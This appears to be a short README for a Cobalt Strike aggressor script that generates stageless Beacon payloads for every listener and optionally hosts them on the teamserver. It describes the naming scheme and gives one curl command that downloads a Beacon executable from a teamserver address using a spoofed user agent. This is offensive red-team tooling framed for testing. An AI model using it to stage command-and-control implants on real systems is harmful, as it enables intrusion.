# Cobalt Strike Payload Generators

It is designed to help quickly create payloads for testing

This aggressor script builds all stageless payload types for each current listener and optionally hosts the payloads on the HTTP server

Payloads Naming Syntax:

Filename:

`beacon_<type>_<listener name>_<arch>.<ext>`

URL:

`http://< teamserver IP >/payloads/beacon_<type>_<listener name>_<arch>.<ext>`

You can quickly curl the payloads

Example:

```
curl -A SOME_ALLOWED_USERAGENT http://192.168.1.100/payloads/beacon_http_http_x64.exe
```






